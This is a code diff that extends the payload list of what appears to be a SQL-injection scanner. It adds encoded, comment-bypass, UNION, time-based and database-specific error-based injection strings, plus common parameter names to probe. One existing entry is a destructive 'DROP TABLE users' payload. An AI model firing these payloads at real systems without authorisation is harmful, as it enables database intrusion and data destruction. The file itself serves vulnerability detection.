@@ -18,20 +18,32 @@ export interface SqliFinding {
 export const SQLI_PAYLOADS = [
   "'",
   "\"",
+  "\\",
   "' OR '1'='1",
   "' OR '1'='1' --",
   "\" OR \"1\"=\"1\" --",
   "') OR ('1'='1",
+  "')) OR 1=1--",
   "1 OR 1=1",
   "1; DROP TABLE users--",
   "'; SELECT pg_sleep(0)--",
   "' UNION SELECT NULL--",
+  "' UNION SELECT NULL,NULL,NULL--",
   "admin'--",
+  "admin' #",
+  "%27%20OR%201%3D1--",            // URL-encoded
+  "%2527%2520OR%25201%253D1--",    // Double-encoded
+  "0/**/OR/**/1=1",                 // Comment-bypass
+  "1' AND SLEEP(0)--",              // Time-based marker
+  "' AND extractvalue(1,concat(0x7e,version()))--", // MySQL error-based
+  "' AND 1=CONVERT(int,@@version)--",                // MSSQL error-based
+  "' || (SELECT '') || '",          // Oracle concat
 ];
 
 export const COMMON_PARAMS = [
   "id", "q", "search", "query", "name", "user", "email", "page",
   "category", "slug", "ref", "lang", "order", "sort", "filter",
+  "uid", "pid", "sid", "token", "callback", "redirect", "next",
 ];
 
 const ERROR_SIGNATURES: Array<[RegExp, string]> = [
